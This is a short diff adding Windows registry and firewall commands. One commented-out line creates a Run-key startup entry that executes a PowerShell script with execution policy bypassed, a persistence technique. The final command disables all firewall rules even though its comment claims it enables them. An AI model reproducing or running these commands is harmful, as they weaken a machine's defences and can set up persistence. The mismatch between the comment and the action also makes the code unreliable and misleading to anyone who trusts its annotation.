@@ -1,0 +1,5 @@
+#reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v 'Shutdown' /t REG_SZ /d 'powershell.exe -ExecutionPolicy Bypass iex "C:\Users\Schuyler\Desktop\toast.ps1"'
+reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 1 /f
+
+#enables all rules
+netsh advfirewall firewall set rule all new enable=no
